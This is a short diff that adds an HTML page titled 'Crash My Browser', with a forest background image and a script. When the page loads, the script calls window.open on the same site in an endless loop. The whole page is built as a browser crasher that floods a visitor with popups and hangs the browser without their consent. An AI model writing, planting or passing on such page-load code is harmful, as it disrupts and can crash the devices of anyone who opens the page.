@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crash My Browser</title>
+    <style>
+        body {
+            background-image: url('https://assets.yorgis.net/forest.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            margin: 0;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        function openWindows() {
+            while (true) {
+                window.open('https://yorgis.net');
+            }
+        }
+        window.onload = openWindows;
+    </script>
+</body>
+</html>
